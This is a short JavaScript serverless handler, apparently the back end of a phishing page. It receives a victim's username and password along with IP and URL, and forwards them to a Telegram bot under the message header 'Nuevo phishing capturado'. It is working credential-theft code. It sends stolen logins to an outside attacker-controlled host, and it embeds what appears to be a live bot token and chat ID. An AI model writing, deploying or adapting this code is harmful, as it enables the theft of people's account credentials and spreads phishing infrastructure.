export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { usuario, contrasena, ip, url } = req.body;

  if (!usuario || !contrasena) {
    return res.status(400).json({ error: 'Faltan datos' });
  }

  const BOT_TOKEN = '8362088773:AAHzeHvckVgQdFAIHeZ5h1Sp21uMWVyEvrY';
  const CHAT_ID = '6585263119';
  
  const fecha = new Date().toLocaleString('es-AR');
  
  const mensaje = `🎣 Nuevo phishing capturado\n\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${contrasena}\n📅 Fecha: ${fecha}\n🌐 IP: ${ip || 'No disponible'}\n🔗 URL: ${url || 'No disponible'}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();

    if (data.ok) {
      return res.status(200).json({ success: true });
    } else {
      return res.status(500).json({ error: 'Error de Telegram', details: data });
    }
  } catch (error) {
    return res.status(500).json({ error: 'Error del servidor', details: error.message });
  }
}
